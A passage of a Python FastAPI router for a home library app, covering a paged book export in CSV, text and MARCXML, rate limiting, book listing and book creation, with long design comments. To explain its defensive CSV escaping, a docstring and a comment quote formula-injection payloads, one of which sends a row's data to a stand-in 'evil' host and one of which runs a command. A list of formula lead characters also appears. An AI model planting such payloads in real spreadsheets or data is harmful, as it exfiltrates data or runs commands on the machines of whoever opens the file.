    measurement and the quadratic it avoids are in that method.

    **The session is still open when this runs, and that is FastAPI's
    arrangement rather than luck.** A `StreamingResponse` body is consumed
    after the route function has returned, and a dependency with `yield` and
    no `dependency_scope` is exited from the request's `AsyncExitStack`, which
    FastAPI closes after the response has been sent rather than before. Making
    `get_db` function scoped would close the session before the first page and
    the second would raise mid body, after a 200.
    `tests/routers/test_imports_marc.py::TestTheExportIsPagedRatherThanWhole`
    drives more than one page through the real ASGI stack, which is what
    covers it.

    **The page size is read here rather than passed in**, so one knob bounds
    every arm and a test that moves it moves all of them together. A MARCXML
    page is the dearest of the three per row: it carries the description in
    `520 $a` as the CSV arm does and wraps every value in XML, so a number
    measured against it is not tight for the other two.
    """
    after: int | None = None
    while True:
        shelf = Shelf.seen_by(db, viewer_id)
        # Narrowed only once there is a row to resume after. A sentinel id
        # standing for "before the first row" would be relying on the primary
        # key never reaching it rather than saying so.
        if after is not None:
            shelf = shelf.where(Book.id > after)
        # Read once per page into a local, because the two uses below have to
        # be the same number: reading the constant twice is how a full page
        # comes to look short, and a short page ends the walk.
        size = marc.EXPORT_PAGE_RECORDS
        books = shelf.limited(size, Book.id.asc(), load=load)
        if not books:
            return
        # Read **before** the page is handed over rather than after it comes
        # back, because the consumer streams and an unknown time passes inside
        # that `yield`. Nothing commits on this session during a response, so
        # nothing expires and the read is safe either way today; this costs a
        # line and stops depending on that.
        cursor = books[-1].id
        short = len(books) < size
        yield books
        # A short page is the last page. A full one costs one more query that
        # comes back empty, which is what a walk with no count pays instead of
        # counting the shelf on every page.
        if short:
            return
        after = cursor


def _marcxml_pages(db: Session, viewer_id: int) -> Iterator[list[Book]]:
    """The walk the MARCXML arm hands to `marc.stream`, bound to its loading.

    **What this function decides is `Loading.PUBLISHED`**; the walk itself is
    `_export_pages` and every arm shares it. **So the guarantees this arm
    relies on are not this arm's**: the paging, the key it resumes on and the
    privacy rule all belong to `_export_pages`, and the classes covering them
    cover the CSV and txt arms too. Retiring MARCXML means deleting this
    function, not that walk.

    **"The privacy rule re-applied per page" is what this sentence used to
    say, and it named the wrong thing as the guarantee.** What makes the export
    private is `Shelf.seen_by`, whose predicate rides in each page's own SQL and
    is carried by any narrowing of it; the per page rebuild is about the
    statement rather than about the viewer, and `_export_pages` measured that.
    A reviewer reading the old wording judges a change to that loop on privacy,
    which is the wrong axis.

    It also keeps a name of its own rather than being `_export_pages` called
    at the route, because the tests that drive the walk alone and the one that
    watches the route hand it over unstarted both reach it by this name.

    **`Loading.PUBLISHED` rather than `EXPORTED`**, and the name is about the
    payload rather than the audience: it is the one option that eagerly loads
    `classifications`, which is the half of a MARC record that makes it worth
    exchanging, and it omits `added_by` and `collection`, which are household
    facts a catalogue record does not carry. Reading them lazily instead would
    be one statement per book, and it would be a lazy load firing after the
    response had begun.

    **`PUBLISHED` also loads `tags`, which `marc.py` never reads**, so that is
    one statement a page doing nothing. Stated rather than fixed: the narrower
    option would be another member of `shelf.Loading`, and that enum is not
    this change's to extend.
    """
    return _export_pages(db, viewer_id, Loading.PUBLISHED)


#: What the export's 200 promises, and it is three media types rather than one.
#:
#: **Derived from `EXPORT_MEDIA_TYPES` rather than listed**, so a fourth format
#: is declared by the same line that makes it sendable and the document cannot
#: be short a type while the route sends it.
#:
#: **Which one arrives depends on `?format=`, and OpenAPI cannot say that.**
#: There is no expression for a response content type conditioned on a request
#: parameter, so the honest declaration is all three under 200 with the mapping
#: written into the route description below. Splitting the route into three, one exact type
#: each, is the only shape that makes it exact and it changes three URLs and
#: the client's URL builder to buy exactness in a document.
#:
#: **No schema under each type, which is the OpenAPI 3.1 spelling for opaque
#: bytes** and not an omission: `format: binary` belonged to 3.0 and JSON Schema
#: 2020-12 has no such format, so a media type object with nothing in it is what
#: says "these bytes, unconstrained".
_EXPORT_CONTENT: Final[dict[str, dict[str, Any]]] = {
    media_type.split(";")[0]: {} for media_type in EXPORT_MEDIA_TYPES.values()
}


@router.get(
    "/export",
    # **Both halves, and either one alone is weaker than it reads.** Measured
    # against this worktree's FastAPI: `responses=` alone leaves
    # `application/json` in the 200 **beside** the real types, because FastAPI
    # derives the 200's content from `response_class.media_type` and the
    # default class is `JSONResponse`; `response_class=StreamingResponse` alone
    # declares no content at all, trading a wrong promise for none.
    # `Response.media_type` is `None`, so the plain class contributes nothing
    # and the dictionary is left as the whole answer.
    #
    # **The handler stays annotated `-> StreamingResponse`**, which is load
    # bearing:
    # `tests/routers/test_auth.py::TestARouteThatSendsNoBodyDocumentsNone`
    # selects the routes it forbids content to by the return **annotation**
    # being exactly `Response`, so this does not recruit the route into a rule
    # that says the opposite.
    response_class=Response,
    responses={
        200: {
            "content": _EXPORT_CONTENT,
            "headers": downloads.DOWNLOAD_DISPOSITION,
        }
    },
)
def export_books(
    db: DbSession,
    current_user: CurrentUser,
    format: Annotated[ExportFormat, Query()] = ExportFormat.CSV,
) -> StreamingResponse:
    """The shelf this member can see, as a file.

    **CSV is `text/csv`, plain text is `text/plain` and MARCXML is
    `application/marcxml+xml`.** All three are declared for the 200 because the
    document has no way to say which of them `?format=` selects.

    **Rationed, and the schema does not say so.** The refusal is a 429 carrying
    `Retry-After`. It is not declared here because this document enumerates no
    refusal on any operation: not a 401, which every secured operation can
    answer, nor a 403, a 404 or a 429. So declaring one here would make this
    refusal look deliberate and every other operation's look accidental, which
    is a decision about the whole error surface rather than about this route.
    `docs/decisions.md` records that reasoning, having refused the same move
    once already, and
    `tests/test_errors.py::TestTheDocumentEnumeratesNoRefusal` is what this
    paragraph rests on rather than a reader's memory of it. The mechanism behind
    the refusal is shared by every route in `ratelimit.py`, so what would make
    declaring it honest is declaring it at all of them. The counter is not:
    this route has its own, for the reason `ratelimit.EXPORT_LIMIT` gives.

    **MARCXML needs library mode and the other two do not.** A CSV export is a
    household reading its own shelf in a spreadsheet. A MARC record is a
    catalogue record handed to another institution, which is what library mode
    is for, and offering it everywhere would put a format nobody in a household
    can use in front of everybody. Enforced here rather than by hiding the menu
    entry: disabling a control in the browser is advice to one client, which is
    the sentence `routers/public.py` already states about the public catalogue.

    **403, not 404.** The route exists and the member may call it; the format
    is switched off. That is the same answer registration gives when it is
    closed, and there is nothing to conceal: `GET /api/settings/features`
    already tells any caller whether library mode is on.
    """
    # **In the body, and the reason is not the one `ratelimit.py`'s docstring
    # gives.** That one is about a key the body has to be parsed to know, and
    # this key is `current_user.username`, which a dependency can see.
    #
    # The reason here is ordering, and it is narrower than "never a dependency",
    # which is what this comment said first and is wrong. Measured against this
    # worktree's FastAPI, a path operation dependency is inserted at the
    # **front** of the route's dependency list, ahead of the endpoint's own
    # parameters. So a charge placed there runs before authentication **unless
    # the charging dependency itself depends on the authenticating one**, in
    # which case FastAPI solves that first and a caller with no session gets 401.
    # `auth.get_current_user` returns a `User` or raises and never returns
    # `None`, so no shape of that dependency is satisfied by an absent session.
    #
    # **That narrowing is this route's, because authentication is its only
    # gate.** Where the gate is authorisation the safe shape is a charge that
    # depends on whichever dependency refuses, and depending on the
    # authenticator alone charges a member who is then answered 403:
    # `routers/backup.download_backup` carries that measurement at its own site.
    # Both shapes were compiled and driven: keyed on `CurrentUser` a dependency
    # answers 401 and never counts, and keyed on `client_address`, which needs no
    # session and is therefore the shape somebody reaches for, it answers 429
    # with the authentication never run.
    #
    # **That second shape is an oracle and a free denial.** A 429 keyed on a
    # username tells a caller with no session that the username exists and has
    # been active inside the window, and the same caller can spend a member's
    # budget without holding one. The body is where the question cannot arise at
    # all, which is why the call is here rather than in a dependency that would
    # be equally safe today and one edit from not being.
    # `TestTheExportDoorIsRationed::test_a_caller_with_no_session_is_401_and_spends_nothing`,
    # in `tests/test_ratelimit.py`, is that claim rather than this paragraph.
    #
    # **Keyed on the authenticated username, never `client_address`.** Behind the
    # reverse proxy this app is documented to sit behind, an address key collapses
    # a household into one bucket, and `Retry-After` is computed from that
    # bucket's first hit, so a shared bucket tells one member when another last
    # exported.
    #
    # **Charged before the library mode gate below**, so a member probing MARCXML
    # with the flag off spends their own export budget. That is self denial and
    # nothing else: `GET /api/settings/features` answers `library_mode` to a
    # caller with no token at all, so there is no oracle here to buy.
    export_limiter.check(current_user.username)

    extension = _EXPORT_EXTENSIONS.get(format, format.value)
    filename = f"endpaper-export-{date.today().isoformat()}.{extension}"

    if format is ExportFormat.MARCXML:
        if not settings_store.library_mode(db):
            raise HTTPException(
                status_code=status.HTTP_403_FORBIDDEN,
                detail="MARC export is a library mode feature.",
            )
        return StreamingResponse(
            # **Paged, and the page is what bounds this route.** The shelf
            # is never in memory whole: `_export_pages` fetches
            # `marc.EXPORT_PAGE_RECORDS` rows at a time and `marc.stream`
            # writes one page of XML at a time, so the peak is a page of each
            # at any shelf size. The library in library mode is the instance
            # with the most books, and this arm used to materialise every one
            # of them for an ordinary account. The CSV and txt arms below walk
            # the same pages: neither is gated by library mode, so an ordinary
            # account reaches them, which made them the worse of the two. What
            # this constant is, and what refusing and truncating would each
            # have cost, is at `marc.EXPORT_PAGE_RECORDS`.
            marc.stream(_marcxml_pages(db, current_user.id)),
            media_type=EXPORT_MEDIA_TYPES[format],
            headers=downloads.attachment(filename),
        )

    chunks = (
        _csv_chunks(db, current_user.id)
        if format is ExportFormat.CSV
        else _text_chunks(db, current_user.id)
    )

    # Handed over unstarted. Both are generator functions, so the shelf is not
    # read until the transport pulls the body, and neither holds more than the
    # page it is writing.
    return StreamingResponse(
        chunks,
        media_type=EXPORT_MEDIA_TYPES[format],
        headers=downloads.attachment(filename),
    )


def _drain(buffer: io.StringIO) -> str:
    """Everything written since the last drain, and reset the buffer.

    One buffer reused across pages rather than one per page: the peak is a
    page of text, which is what the paging is for, and a fresh `csv.writer`
    each time would be a second place the dialect is decided.
    """
    text = buffer.getvalue()
    buffer.seek(0)
    buffer.truncate(0)
    return text


def _csv_chunks(db: Session, viewer_id: int) -> Iterator[str]:
    """The CSV export, one chunk a page.

    The header is yielded before the first page, so an empty shelf still
    downloads a file a spreadsheet can open rather than nothing at all.
    """
    # **Streaming buys the bound with a truncation, and the exporting member
    # induces it with no privilege.** The status line goes out before page
    # one, so a failure at page k is a 200 that ends early. `database is
    # locked` mid walk truncates where it used to 500: it takes a write held
    # past `database.py`'s five second `busy_timeout`, which that module names
    # as an import, a restore or emptying the trash, so an import in one tab
    # beside an export in another is the reproduction. The MARCXML arm
    # took that trade on the artefact self invalidating, an unclosed
    # `<collection>` being refused by every parser. **A short CSV is a valid
    # CSV**, and `routers/imports.py::/csv` is what reads this file back, so
    # here it is member data lost on the backup path. The chunked terminator
    # is the only signal left, `docs/security.md` documents this app behind a
    # reverse proxy, and whether one restores that signal here is
    # **unmeasured**. Do not buffer the file back to get a better one: the
    # peak this paging removed is what that costs.
    buffer = io.StringIO()
    writer = csv.writer(buffer)
    writer.writerow(
        [
            "Title", "Author", "ISBN", "ISBN13", "Publisher",
            "Year", "Pages", "Description", "Tags", "My Status",
            "Rating", "Date Read", "Date Added", "Added By", "Format",
            "Condition", "Location", "Collection", "Purchase Price",
            "Purchase Currency", "Purchased On", "Purchased From",
        ]
    )
    yield _drain(buffer)

    for books in _export_pages(db, viewer_id, Loading.EXPORTED):
        # Batched per page rather than queried per book, and empty costs no
        # statement. `status_of` is what applies "absence means unread", so
        # the writer below reads a value for every row rather than a default
        # per cell. Per page rather than over the whole shelf, because a map
        # of every row's status is the same unbounded thing the page bounds.
        statuses = Reading.by(db, viewer_id).of([book.id for book in books])
        for book in books:
            # This member's own row, or None where they never touched the
            # book. Free: `statuses` was batched for this page above, so the
            # rating and the read date cost no statement. Without them a
            # member who exports and imports their own shelf loses every
            # rating and every read date, which is data the importer has
            # always been able to read back.
            reading = statuses.get(book.id)

            # **Every cell goes through `_csv_safe`, with no exceptions and no
            # list of them.** Eight used to be exempt on the argument that
            # their column's type or validator makes a leading `=` impossible,
            # and two things were wrong with it. `purchase_currency` was not
            # actually one of those columns and shipped a live formula. And the
            # argument names the validator at the **API**, where
            # `backup._parse_row` inserts a restored archive through Core: it
            # coerces the temporal columns and nothing else, and SQLite is
            # dynamically typed, so `books.year` will hold `=cmd|'/c calc'!A1`
            # and read it back as that string. The admin who restores is not
            # the member who later opens the export.
            #
            # Escaping unconditionally costs nothing, because `_csv_safe` only
            # touches a value that would otherwise be executed: no year, price,
            # date, status or enum value **that a validated write produces**
            # gains a character. The ones that do are what this is for.
            # `test_books.py::TestNoCellOfTheCsvExportSkipsTheEscape` reads this call's
            # own arguments and fails on any cell that is not a `_csv_safe`
            # call, which is a rule with nothing in it to keep in step.
            writer.writerow(
                [
                    _csv_safe(book.title),
                    _csv_safe(book.author),
                    _csv_safe(book.isbn),
                    # The same expression as the column before it, and the
                    # column earns its place as a **label** rather than as
                    # data. `books.isbn` holds an ISBN-13 on every path that
                    # validates, so a receiving tool that maps a bare `ISBN`
                    # column onto its ISBN-10 slot now has one that says which
                    # form it got. It is a claim about the cell rather than a
                    # guarantee: a restored archive writes this column through
                    # Core, which check digits nothing.
                    _csv_safe(book.isbn),
                    _csv_safe(book.publisher),
                    _csv_safe(book.year),
                    _csv_safe(book.page_count),
                    _csv_safe(book.description),
                    _csv_safe("; ".join(tag.name for tag in book.tags)),
                    _csv_safe(statuses.status_of(book.id)),
                    _csv_safe(reading.rating if reading else None),
                    _csv_safe(
                        reading.finished_at.date().isoformat()
                        if reading and reading.finished_at
                        else None
                    ),
                    _csv_safe(_added_on(book)),
                    _csv_safe(_added_by(book)),
                    _csv_safe(book.format),
                    _csv_safe(book.condition),
                    _csv_safe(book.location),
                    # The name, not the id: an export is read by people, and a
                    # foreign key means nothing in a spreadsheet. Through
                    # `_csv_safe` like every other member-supplied cell,
                    # because a collection is named by a member.
                    _csv_safe(book.collection.name if book.collection else ""),
                    # Back to major units for the export. A spreadsheet column
                    # of cents is not what anybody means by "what did this
                    # cost", and an export is read by people, not by us.
                    _csv_safe(_price_column(book.purchase_price_minor)),
                    _csv_safe(book.purchase_currency),
                    _csv_safe(book.purchased_at.isoformat() if book.purchased_at else ""),
                    _csv_safe(book.purchase_source),
                ]
            )
        yield _drain(buffer)


def _text_chunks(db: Session, viewer_id: int) -> Iterator[str]:
    """The `txt` export, one chunk a page.

    The blank line between two records belongs to the pair rather than to
    either one, so it leads every chunk after the first. A trailing separator
    instead would put an empty record at the end of every file.
    """
    # Truncates the same way `_csv_chunks` does, for the same reason; that
    # comment is the one home. No importer reads this format back.
    separator = ""
    for books in _export_pages(db, viewer_id, Loading.EXPORTED):
        # Batched per page, for the reason `_csv_chunks` states.
        statuses = Reading.by(db, viewer_id).of([book.id for book in books])
        blocks: list[str] = []
        for book in books:
            # **Every value goes through `_one_line`, with no exceptions and no
            # list of them**, exactly as every CSV cell goes through
            # `_csv_safe`. A record here is lines, and a line is `Label: value`,
            # so a value carrying a newline writes a line of its own: a
            # description ending `\nAdded By: someone else` forges the one field
            # in this file that says who owns a row. `_csv_safe` does not help,
            # because the lead is not at the start of the value, it is at the
            # start of a line inside it.
            #
            # `test_books.py::TestNoLineOfTheTextExportSkipsTheFlattening` reads
            # this list's own elements and fails on any value that is not a
            # `_one_line` call, so there is nothing here to keep in step.
            blocks.append(
                "\n".join(
                    [
                        f"Title: {_one_line(book.title)}",
                        f"Author: {_one_line(book.author)}",
                        f"ISBN: {_one_line(book.isbn)}",
                        f"Publisher: {_one_line(book.publisher)}",
                        f"Year: {_one_line(book.year)}",
                        f"Tags: {_one_line('; '.join(tag.name for tag in book.tags))}",
                        f"My Status: {_one_line(statuses.status_of(book.id))}",
                        f"Date Added: {_one_line(_added_on(book))}",
                        f"Added By: {_one_line(_added_by(book))}",
                        f"Description: {_one_line(book.description)}",
                    ]
                )
            )
        yield separator + "\n\n".join(blocks)
        separator = "\n\n"


#: Characters that make a spreadsheet treat a cell as a formula rather than as
#: text. Tab and carriage return are here because Excel strips them and then
#: reads whatever follows, so a value beginning "\t=cmd..." executes too.
_FORMULA_LEAD: Final = ("=", "+", "-", "@", "\t", "\r")


def _csv_safe(value: object) -> str:
    """Neutralise a cell that a spreadsheet would run as a formula.

    **Applied to every cell of the CSV export, typed columns included**, and
    the caller carries the reason: a validated write cannot produce a value
    this touches, and a restored archive is not a validated write.

    Most of those columns are member-supplied: titles, authors, publishers,
    descriptions, shelf locations and **tag names**. Tags are library wide, so
    a tag put on a public book reaches every other member's export.
    `=HYPERLINK("http://evil/?d="&A1,"ok")` in a title exfiltrates the row when
    an admin opens the file, and `=cmd|'/c calc'!A1` is the older trick.
    `csv.writer` quotes for CSV correctness and does nothing about this.

    A leading apostrophe is the conventional fix: Excel and LibreOffice both
    treat the cell as text and hide the character. It is applied only to values
    that would otherwise be executed, so an ordinary title is untouched.
    """
    text = "" if value is None else str(value)
    return f"'{text}" if text.startswith(_FORMULA_LEAD) else text


def _one_line(value: object) -> str:
    r"""Flatten a value onto the one line the `txt` export gives it.

    **The record separator in that format is a newline**, and a line is
    `Label: value`, so a value carrying a newline opens a line of its own and an
    attacker chosen line is a forged field. `Added By:` is the one that names
    who owns a row, which is why the CSV importer refuses to read that column
    back at all. A forged line beginning `=` is then run by Excel's text import
    wizard, and flattening closes that too: with this applied, every line in the
    file begins with a label, so no field this app writes can start with a
    formula lead.

    `_csv_safe` is the wrong tool and not merely insufficient: it looks at the
    start of the **value**, and the character that matters here is at the start
    of a line **inside** it.

    The collapse itself is `schemas.common.one_line`, which the fields that
    have to be one line go through on the way in; this is the same rule applied
    on the way out, with a `None` and a non string to absorb. What it rests on is
    wider than what the validators rest on: `str.split()` with no argument
    splits on every run of whitespace, and whitespace is a **superset** of what
    a reader breaks a line on, so the carriage return, the form feed, the
    vertical tab, the file and record separators and Unicode's own line
    separators go with the newline and the result is one line whatever the value
    held. Chosen over replacing `\n` alone because a CR-only line break is a
    line break to a Windows editor and to Excel.

    **The set is derived from what a line break is, never listed**, and so is
    the guard over it: `test_books.py::TestTheTextExportCannotBeMadeToForgeALine`
    sweeps the whole of Unicode on every run for the code points
    `str.splitlines()` breaks on, asserts this function removes each of them,
    and drives one HTTP arm per break. **No count is written here on purpose.**
    The version of this docstring that named five characters had five arms
    behind it naming the same five: measured, a rewrite flattening exactly those
    five was caught by nothing, and by six named arms once the sweep replaced
    them.

    One list survives that, `_BREAKS_AS_MEASURED` beside the sweep, and it is a
    floor rather than the rule. Arms parametrised off a derived set shrink with
    it in silence, so something has to hold what the sweep found when somebody
    last looked. It is the only thing a narrowed sweep goes red against.

    **It changes what the export contains, and the owner approved that on
    2026-09-17.** A multi line description already rendered as an
    indistinguishable block in this format, since nothing indents or quotes a
    continuation, so what is lost is a paragraph break in a value a reader
    could not parse anyway. What is gained is that the file cannot be made to
    say something the library never recorded. Nothing reads this format back:
    `import_readers` has no `txt` reader and the CSV arm is the round tripping
    one, which is what makes flattening affordable here and not there.

    Applied to the typed values too, for the reason the CSV arm states at its
    own call site: the argument that a column's validator makes this impossible
    names the validator at the API, and `backup._parse_row` inserts a restored
    archive through Core, which coerces the temporal columns and nothing else.
    """
    return "" if value is None else one_line(str(value))


def _added_on(book: Book) -> str:
    """The date a Book was added, as an export writes it.

    A date rather than the stored timestamp, and empty rather than `None`: that
    is a decision about what an export says, and both arms of this handler make
    it the same way. It was written out twice, character for character, which
    is two places for one rule and was how the `txt` arm came to differ from
    the CSV arm on other fields.
    """
    return book.added_at.date().isoformat() if book.added_at else ""


def _added_by(book: Book) -> str:
    """Who added a Book, as an export writes it: the username, not the row.

    Empty for a Book whose adding member is gone, rather than the word `None`
    in a column that names who owns the row. See `_added_on`.
    """
    return book.added_by.username if book.added_by else ""


def _price_column(minor: int | None) -> str:
    """Cents back to a plain decimal string, for the export only.

    Two decimal places always, so a column of prices lines up and a
    spreadsheet reads them as numbers rather than as text.
    """
    return "" if minor is None else f"{minor / 100:.2f}"


# ── Listing ───────────────────────────────────────────────────────────────────

@router.get("", response_model=Page[BookOut])
def list_books(
    db: DbSession,
    current_user: CurrentUser,
    paging: Paging,
    q: Annotated[str | None, Query(max_length=200)] = None,
    status_filter: Annotated[ReadStatus | None, Query(alias="status")] = None,
    tags: TagIdList = None,
    ownership: Annotated[OwnershipStatus | None, Query()] = None,
    format: Annotated[BookFormat | None, Query()] = None,
    lending: Annotated[LendingWillingness | None, Query()] = None,
    series: Annotated[str | None, Query(max_length=SERIES_NAME_MAX)] = None,
    author: Annotated[
        str | None,
        Query(
            max_length=AUTHOR_KEY_MAX,
            description="Only books credited to this author, by key or by any spelling",
        ),
    ] = None,
    location: Annotated[str | None, Query(max_length=LOCATION_MAX)] = None,
    collection_id: Annotated[
        int | None,
        Query(
            ge=1,
            # Bounded above for the reason `after_id` is, and this one has no
            # lower-bound-only escape: a Python int has no ceiling and SQLite's
            # does, so an id above 2**63-1 would reach the driver and raise
            # `OverflowError` from inside the query, answering 500 to a value
            # the caller chose.
            le=MAX_ROW_ID,
            description="Only books filed in this collection",
        ),
    ] = None,
    unfiled: Annotated[
        bool, Query(description="Only books in no collection at all")
    ] = False,
    unrated: Annotated[bool, Query(description="Only books you have not rated")] = False,
    discuss: Annotated[
        bool, Query(description="Only books somebody has offered to talk about")
    ] = False,
    classification: HeadingList = None,
    ddc_division: Annotated[DivisionList, Query(alias="ddc")] = None,
    sort: Annotated[BookSort, Query()] = BookSort.TITLE_ASC,
) -> Page[BookOut]:
    # Two parameters rather than a magic id for "none", and refused together
    # rather than one silently winning. "Books in collection 3" and "books in
    # no collection" are different questions, and a caller that asked both has
    # made a mistake worth being told about: picking one for them is how a
    # filter quietly shows the wrong shelf.
    #
    # Refused here rather than in `BookFilters`, because it is a fact about
    # this request and the answer is a 400 with a sentence in it. A filter
    # value object that raised HTTP exceptions would be a schema wearing a
    # router's hat.
    if collection_id is not None and unfiled:
        raise HTTPException(
            status_code=400,
            detail="Ask for one collection or for the unfiled books, not both.",
        )

    # The author name is resolved to ids **here**, not on the shelf: deciding
    # which spellings are one person needs the alias rows and the folding
    # rules, which is an identity question and belongs to `authorship.py`. See
    # `BookFilters.author_ids`.
    #
    # The resolution is bounded by the visible catalogue, because every id it
    # returns came out of a query that applied the predicate. Two extra
    # statements, and they are **per page rather than per request**: this runs
    # again for every page of a filtered listing, and each time it re-reads
    # every visible credit line and re-splits it. Measured in
    # `test_books_authors.py`.
    author_ids = (
        None
        if author is None
        else Authorship.seen_by(db, current_user.id).book_ids_for(author)
    )

    filters = BookFilters(
        q=q,
        status=status_filter,
        tag_ids=row_ids(tags, field="tags"),
        ownership=ownership,
        format=format,
        lending=lending,
        series=series,
        author_ids=author_ids,
        location=location,
        collection_id=collection_id,
        unfiled=unfiled,
        unrated=unrated,
        discuss=discuss,
        headings=parse_headings(classification),
        ddc_divisions=parse_divisions(ddc_division),
    )

    books, total = (
        Shelf.seen_by(db, current_user.id)
        .matching(filters)
        .page(paging.offset, paging.limit, *order_for(sort), load=Loading.SERIALISED)
    )

    return Page[BookOut](
        items=books_to_out(books, current_user, db),
        total=total,
        page=paging.page,
        page_size=paging.page_size,
    )


# ── Creating ──────────────────────────────────────────────────────────────────


def _store_cover(book: Book) -> bool:
    """Give this book the best cover available, held here where possible.

    True when something changed and the caller must commit.

    Every path that puts a book in the catalogue calls this, which is the point:
    the CSV import never resolved a cover at all, so a library that arrived by
    import showed the placeholder on every single book and no log line said why.

    Blocking, deliberately: see the note above `covers.download`. Bounded, too:
    without a ceiling a single add is up to three candidate checks and a
    download at `covers.TIMEOUT_SECONDS` each, which is 24 seconds of a spinner
    when both image services blackhole rather than refuse.
    """
    # Already held here: the URL points at this app and there is a file behind
    # it. The file test is not paranoia, it is what stops the column and the
    # directory drifting apart without anybody noticing.
    if covers.is_local(book.cover_url) and cover_store.path_of(book.id) is not None:
        return False

    # Budgeted, because every caller of this is a request with a person waiting
    # at the end of it. What a run with **no** budget is bounded by is not
    # restated here: `covers.resolve_and_store`'s own note is the one place that
    # number lives, and the version of this comment that carried a second copy
    # went stale the day the walk grew a per hop wall clock bound.
    resolved = covers.resolve_and_store(
        book.id, book.isbn, book.cover_url, budget=covers.INTERACTIVE_BUDGET_SECONDS
    )
    if resolved is None or resolved == book.cover_url:
        return False
    book.cover_url = resolved
    return True


def _checked_collection(db: Session, collection_id: int | None, viewer_id: int) -> int | None:
    """The id of a collection this caller may file into, or None, or a 400.

    Every write that files a book goes through here. Without it an unknown id
    reaches the foreign key and surfaces as a 500 from inside an add, which
    tells the caller nothing about what they got wrong.

    A 400 rather than a 404: the request is about a book, and the thing that
    does not exist is a field in its body.

    **And the same 400 for a collection this caller may not be told about**,
    which is `shelving.Shelving.assignable`. It is the harm this door carried
    and it was the sharper half of the two: a tag attach against a guessed id
    hands back the book, and this hands back the **name**, through
    `collection_name` on the `BookOut` three of the four call sites return. So
    a guessed name answered 201 with the row and filing into it then completed,
    with no second gate anywhere, on a consecutive integer primary key and
    under no rate limit. The docstring here used to argue that was fine,
    because collections are library wide and there was nothing to withhold.
    That was the ticket's premise stated as a justification. See
    `shelving.Shelving`, and `_require_tag` below for the same repair one
    entity over.

    A fresh collection is still writable, which is what keeps the "make one and
    file this book into it in a single press" flow working: nothing carries it,
    so `Shelving`'s third arm admits it.

    The range check is not redundant with the schemas that bound this field.
    `BulkRequest.value` is deliberately loose (`str | int | None`, because which
    field it fills depends on the verb), so the bulk verb parses an id out of it
    and arrives here having validated nothing. An id past SQLite's INTEGER
    raises `OverflowError` from inside `db.get`, which is a 500 rather than a
    refusal. See `MAX_ROW_ID`.
    """
    if collection_id is None:
        return None
    if not 1 <= collection_id <= MAX_ROW_ID:
        raise HTTPException(status_code=400, detail="No such collection")
    if db.get(Collection, collection_id) is None:
        raise HTTPException(status_code=400, detail="No such collection")
    if not Shelving.seen_by(db, viewer_id).assignable(collection_id):
        raise HTTPException(status_code=400, detail="No such collection")
    return collection_id


def _create_book(payload: BookCreate, current_user: User, db: Session, conflict: str) -> BookOut:
    # payload.isbn is already canonical ISBN-13 (see BookCreate's validator),
    # but rows written before canonicalisation may hold the ISBN-10, so both
    # spellings are checked or the same book gets added twice.
    #
    # The ISBN walk below reads through `whole_table_for_uniqueness` rather
    # than a shelf: the ISBN is unique across the whole table, so a clash with
    # somebody else's private book is still a clash. That also means it sees
    # **trashed** rows, which is the trap soft deletion introduces and
    # `_freeable` exists to resolve.
    # Before the ISBN walk below, which purges trashed rows to free the number.
    # A bad collection id refused afterwards would have destroyed them first.
    _checked_collection(db, payload.collection_id, current_user.id)

    freed: list[int] = []
    if payload.isbn:
        forms = isbn_utils.equivalent_forms(payload.isbn)
        if forms:
            # `whole_table_for_uniqueness`, not a shelf: the ISBN is unique
            # across the whole table, invisible rows included, so a filtered
            # check would miss the row that is actually going to collide and
            # turn a 409 into a 500.
            #
            # **Every holder, not the first one.** Copies made it possible for
            # several rows to hold one ISBN, and freeing only the first was
            # wrong in two different ways, both measured through the API: a
            # trashed group of two answered **500** (`IntegrityError: UNIQUE
            # constraint failed: books.isbn`, because the survivor's token was
            # cleared as the group shrank and it re-entered the partial index
            # just as the insert reclaimed the ISBN), and a trashed group of
            # three answered **201**, purging one row and adding a stray fourth
            # beside the two that still held the ISBN.
            #
            # Ordered live-first so the row named in a 409 is the one on the
            # shelf rather than one in the trash.
            holders = (
                whole_table_for_uniqueness(db)
                .filter(Book.isbn.in_(forms))
                .order_by(Book.deleted_at.isnot(None), Book.id)
                .all()
            )
            # Decided in full before anything is destroyed. `_purge` is not
            # undoable by the request failing: it used to unlink the cover file
            # itself, so a 409 raised half way through a group left a member
            # holding a book whose cover was gone. That unlink now happens
            # after the commit, and this loop is what makes sure there is
            # nothing to undo in the first place.
            blocker = next(
                (holder for holder in holders if not _freeable(holder, current_user)),
                None,
            )
            if blocker is not None:
                raise HTTPException(
                    status_code=status.HTTP_409_CONFLICT,
                    detail=_conflict_detail(conflict, blocker, current_user),
                )
            freed = [_purge(holder, db) for holder in holders]
            if freed:
                # Flushed, not committed: this function owns the transaction
                # and commits once. Without this the DELETEs are still pending
                # when the INSERT runs and the unique ISBN index rejects it,
                # which is the whole thing this avoids.
                db.flush()

    fields = payload.model_dump()
    # The loop rather than one `pop` per name, so this list and the import time
    # refusal in `schemas/book.py` are the same object: a field added to the body
    # that the constructor cannot take stops every test run there rather than
    # failing the first create. Two cells because the reasons differ.
    # `Book.classifications` is a relationship, so handing it a list of plain
    # dicts raises rather than building rows, and the validated models on
    # `payload` are what the rows are written from. `categories` IS a column, and
    # is popped because its stored shape is one joined string: the constructor
    # would take the list and the INSERT would fail on it.
    for name in POPPED_BEFORE_THE_CONSTRUCTOR:
        fields.pop(name, None)
    book = Book(
        **fields,
        # Paired with the pop deliberately. A pop with no write is a 201 that
        # accepted a field and stored nothing, which is the quietest failure
        # available here, so the refusal named above holds both halves.
        categories=google_books.join_categories(payload.categories),
        added_by_user_id=current_user.id,
    )
    db.add(book)
    # Before the commit, so a book and the headings it was added with land in
    # one transaction: a failure here must not leave a book claiming a
    # provenance no row records.
    add_headings(book, payload.classifications, db)
    # In the same transaction and for the same reason. This is the route a store
    # import writes an ASIN or a Google volume id through, and a Book that
    # arrived without the identifier its import read cannot be told apart
    # afterwards from one whose store carried none.
    add_identifiers(book, payload.identifiers, db)
    db.commit()
    db.refresh(book)

    # After the commit, and before the new book's own cover is stored. SQLite
    # reuses the id of a deleted row, so the book just inserted may well have
    # taken one of these: forgetting here is what stops it inheriting somebody
    # else's cover, and doing it after `_store_cover` would delete its own.
    for book_id in freed:
        cover_store.remove(book_id)

    # After the commit, because the cover is stored under the book's id and the
    # id does not exist until the row does. A failed fetch is not a failed add:
    # `store_cover` returns the remote URL, or leaves the book without one.
    if _store_cover(book):
        db.commit()
        db.refresh(book)
    return book_to_out(book, current_user, db)


def _conflict_detail(message: str, holder: Book, current_user: User) -> str | dict[str, object]:
